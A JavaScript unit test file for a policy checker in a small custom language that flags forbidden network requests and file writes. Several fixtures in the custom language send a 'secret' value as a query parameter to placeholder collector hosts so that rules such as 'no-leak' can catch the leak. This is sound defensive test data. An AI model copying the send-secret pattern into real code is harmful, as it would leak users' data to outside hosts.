// js/test/rules.test.mjs — pure-JS unit tests for the rule checker (Phase 4).
//
// Cross-implementation agreement against rules.py lives in test_js_rules.py.
// This file covers the JS side directly: a real violation, a permit clearing a
// forbid, a conflict raising, a named subject that cannot resolve raising, and
// that RuleResults carries resolvedSubjects.
//
// Run: node --test js/test/

import { test } from "node:test";
import assert from "node:assert/strict";
import { loadGrammar } from "../loader_node.mjs";
import { parse } from "../parser.mjs";
import { analyse } from "../shapes.mjs";
import { readFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { check, fingerprint, renderViolation, RuleConflict, RuleNotSupported } from "../rules.mjs";
import { analyseFile } from "../shapes_node.mjs";

const REPO = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");

loadGrammar();

function rulesOf(src) {
  return parse(src).filter((s) => s.__node === "Rule");
}

test("a forbidden effect is one violation with the right lines", () => {
  const src =
    "use http\nrule [no-net] anything may not ask\n" +
    'x = ask "https://example.com/a.json"\n';
  const v = check(rulesOf(src), analyse(src));
  assert.equal(v.length, 1);
  assert.ok(v[0].is_violation);
  assert.match(v[0].render(), /violated at line 3/);
  assert.match(v[0].render(), /rule declared at line 2/);
});

test("a permit that supersedes a forbid clears it", () => {
  const denyFp = fingerprint(rulesOf("rule [no-send] anything may not ask\n")[0]);
  const src =
    "use http\nrule [no-send] anything may not ask\n" +
    `rule [ok] anything may ask to "https://audit.internal" supersedes [no-send] @${denyFp}\n` +
    'x = ask "https://audit.internal"\n';
  const v = check(rulesOf(src), analyse(src));
  assert.equal(v.length, 1);
  assert.equal(v[0].is_violation, false);
  assert.equal(v[0].cleared_by.name, "ok");
});

test("a supersedes clause with no fingerprint at all is refused (B3)", () => {
  const src =
    "use http\nrule [no-send] anything may not ask\n" +
    'rule [ok] anything may ask to "https://audit.internal" supersedes [no-send]\n' +
    'x = ask "https://audit.internal"\n';
  assert.throws(() => check(rulesOf(src), analyse(src)), (e) => {
    assert.ok(e instanceof RuleConflict);
    assert.match(e.message, /supersedes \[no-send\] \(line 2\) without its fingerprint/);
    assert.match(e.message, /write supersedes \[no-send\] @[0-9a-f]{6}/);
    return true;
  });
});

test("an equal-specificity opposite-assertion pair raises RuleConflict", () => {
  const src =
    'rule [a] anything may not ask to "https://x"\n' +
    'rule [b] anything may ask to "https://x"\n' +
    'y = ask "https://x"\n';
  assert.throws(() => check(rulesOf(src), analyse(src)), RuleConflict);
});

test("a named subject that resolves nowhere raises RuleNotSupported", () => {
  const src =
    "use http\nrule [x] nonexistent-name may not ask\n" +
    'y = ask "https://example.com/a.json"\n';
  assert.throws(() => check(rulesOf(src), analyse(src)), RuleNotSupported);
});

test("check reports the subjects it resolved", () => {
  const src =
    "use http\nto send of payload:\n" +
    '  give ask "https://c.example.com/?d=" + payload\n\n' +
    "rule [no-leak] payload may not ask\n" +
    'x = send of "secret"\n';
  const v = check(rulesOf(src), analyse(src));
  assert.deepEqual(v.resolvedSubjects, ["payload"]);
});

test("fingerprint is six lowercase hex characters", () => {
  const r = rulesOf('rule [r] anything may not write to "refunds.json"\n')[0];
  assert.match(fingerprint(r), /^[0-9a-f]{6}$/);
});

// ============================================================ contradicts (B3, Track 0 #5)

test("a pair that both apply is reported as a contradiction", () => {
  const src =
    "use http\nuse file\n" +
    "rule [no-writes] anything may not write\n" +
    "rule [no-sends] anything may not ask contradicts [no-writes]\n" +
    'write 1 to "out.txt"\n' +
    'x = ask "https://x.example.com"\n';
  const v = check(rulesOf(src), analyse(src));
  const contradictions = v.filter((r) => r.contradicts_rule !== null);
  assert.equal(contradictions.length, 1);
  const c = contradictions[0];
  assert.equal(c.is_violation, true);
  assert.equal(c.rule.name, "no-sends");
  assert.equal(c.contradicts_rule.name, "no-writes");
  assert.match(
    c.render(),
    /^\[no-sends\] contradicts \[no-writes\]: both apply to this program/,
  );
});

test("a pair where one is vacuous is not reported", () => {
  const src =
    "use http\n" +
    "rule [no-writes] anything may not write\n" +
    "rule [no-sends] anything may not ask contradicts [no-writes]\n" +
    'x = ask "https://x.example.com"\n';
  const v = check(rulesOf(src), analyse(src));
  assert.ok(!v.some((r) => r.contradicts_rule !== null));
});

test("contradicts naming an unknown rule raises RuleConflict", () => {
  const src = "rule [a] anything may not ask contradicts [ghost]\n";
  assert.throws(() => check(rulesOf(src), analyse(src)), (e) => {
    assert.ok(e instanceof RuleConflict);
    assert.match(e.message, /contradicts \[ghost\], which is not a rule in this file/);
    return true;
  });
});

test("a rule contradicting itself raises RuleConflict", () => {
  const src = "rule [a] anything may not ask contradicts [a]\n";
  assert.throws(() => check(rulesOf(src), analyse(src)), (e) => {
    assert.ok(e instanceof RuleConflict);
    assert.match(e.message, /contradicts itself/);
    return true;
  });
});

test("the same pair declared from both sides raises RuleConflict", () => {
  const src =
    "rule [a] anything may not ask contradicts [b]\n" +
    "rule [b] anything may not write contradicts [a]\n";
  assert.throws(() => check(rulesOf(src), analyse(src)), (e) => {
    assert.ok(e instanceof RuleConflict);
    assert.match(e.message, /already contradicts/);
    return true;
  });
});

// ============================================================ B4: render() is pure over fields

// B4's proof, one violation at a time: renderViolation fed the JSON round-
// tripped through JSON.stringify/JSON.parse (exactly what a --json --rules
// consumer would see, "message" property and all) must equal v.render()
// byte for byte. If some fact the text states were missing from asJson(),
// this is where it would show up as a mismatch.
function assertRenderMatchesFields(v) {
  const doc = v.asJson();
  const doc2 = JSON.parse(JSON.stringify(doc));
  const got = renderViolation(doc2);
  assert.equal(got, v.render());
}

test("render() is a pure function of asJson()'s fields, over every violation shape", () => {
  const programs = [];

  // real (uncertain) + narrowed: "no-net" is narrowed by "no-telemetry",
  // and "no-telemetry" itself matches a computed (uncertain) target.
  programs.push(
    "use http\n" +
      "to send of payload:\n" +
      '  give ask "https://collector.example.com/?d=" + payload\n\n' +
      "rule [no-net] anything may not ask\n" +
      "rule [no-telemetry] anything may not ask " +
      'to "https://collector.example.com"\n' +
      'x = send of "secret"\n',
  );

  // cleared by a permit
  const denySrc = "rule [no-external-sends] anything may not ask";
  const fp = fingerprint(rulesOf(denySrc)[0]);
  programs.push(
    `use http\n${denySrc}\n` +
      `rule [audit-allowed] anything may ask to "https://audit.internal" ` +
      `supersedes [no-external-sends] @${fp}\n` +
      'x = ask "https://audit.internal"\n',
  );

  // vacuous situation 1 -- no effect of the kind at all
  programs.push(
    'use file\nlet secret = "value"\nshow secret\n' +
      "rule [no-secret-uploads] secret may not ask\n",
  );

  // vacuous situation 2 -- effects of the kind exist, none derive from the subject
  programs.push(
    "use http\nuse file\n\n" +
      'let endpoint = "https://api.example.com/data"\n' +
      'let readings = read of "sensor.txt"\n\n' +
      "show readings\nask endpoint\n\n" +
      "rule [no-reading-uploads] readings may not ask\n",
  );

  // vacuous situation 3 -- subject reaches the kind, target excludes it
  programs.push(
    'use http\nlet payload = "secret"\n' +
      'let full = "https://collector.example.com/?d=" + payload\n' +
      "rule [no-other-leak] payload may not ask " +
      'to "https://different.example.com"\n' +
      "x = ask full\n",
  );

  // contradiction, with `because`
  programs.push(
    "use http\nuse file\n" +
      "rule [no-writes] anything may not write\n" +
      "rule [no-sends] anything may not ask contradicts [no-writes]\n" +
      '  because "no exfiltration once state has changed"\n' +
      'write 1 to "out.txt"\n' +
      'x = ask "https://x.example.com"\n',
  );

  // contradiction, no `because`
  programs.push(
    "use http\nuse file\n" +
      "rule [no-writes2] anything may not write\n" +
      "rule [no-sends2] anything may not ask contradicts [no-writes2]\n" +
      'write 1 to "out.txt"\n' +
      'x = ask "https://x.example.com"\n',
  );

  const shapesSeen = new Set();
  for (const src of programs) {
    for (const v of check(rulesOf(src), analyse(src))) {
      assertRenderMatchesFields(v);
      if (v.contradicts_rule !== null) {
        shapesSeen.add("contradiction");
        if (v.rule.annotation) shapesSeen.add("contradiction-because");
      } else if (v.vacuous) {
        shapesSeen.add(`vacuous-${v.vacuous_situation}`);
      } else if (v.cleared_by !== null) {
        shapesSeen.add("cleared");
      } else if (v.narrowed_by.length) {
        shapesSeen.add("narrowed");
      } else {
        shapesSeen.add("real");
      }
      if (v.uncertain) shapesSeen.add("uncertain");
    }
  }

  assert.deepEqual(
    [...shapesSeen].sort(),
    [
      "cleared",
      "contradiction",
      "contradiction-because",
      "narrowed",
      "real",
      "uncertain",
      "vacuous-1",
      "vacuous-2",
      "vacuous-3",
    ].sort(),
  );
});

const RULE_CORPUS_FILES = [
  "annotated.planes",
  "demo/rules/clean.planes",
  "demo/rules/violation.planes",
  "demo/rules/exception.planes",
  "demo/mcp/v1.planes",
  "demo/mcp/v2.planes",
  "corpus/allowed-hosts.planes",
  "corpus/audit-log.planes",
];

test("render() is a pure function of asJson()'s fields, over the rule corpus", async () => {
  for (const rel of RULE_CORPUS_FILES) {
    const abspath = path.join(REPO, rel);
    const src = readFileSync(abspath, "utf-8");
    const found = rulesOf(src);
    const surface = await analyseFile(abspath, true);
    for (const v of check(found, surface, abspath)) {
      assertRenderMatchesFields(v);
    }
  }
});
